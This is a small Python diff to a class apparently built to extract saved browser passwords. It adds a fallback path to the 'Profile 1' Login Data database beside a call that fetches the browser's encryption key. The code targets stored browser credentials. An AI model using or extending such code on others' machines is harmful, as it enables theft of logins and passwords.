@@ -77,6 +77,9 @@ class Bpassword(object):
         key = self.get_encryption_key(browser)
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                browser[0], browser[1], "User Data", "default", "Login Data")
+        if not os.path.exists(db_path):
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                                   browser[0], browser[1], "User Data", "Profile 1", "Login Data")
 
         # db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
         #                        "Microsoft", "Edge", "User Data", "default", "Login Data")
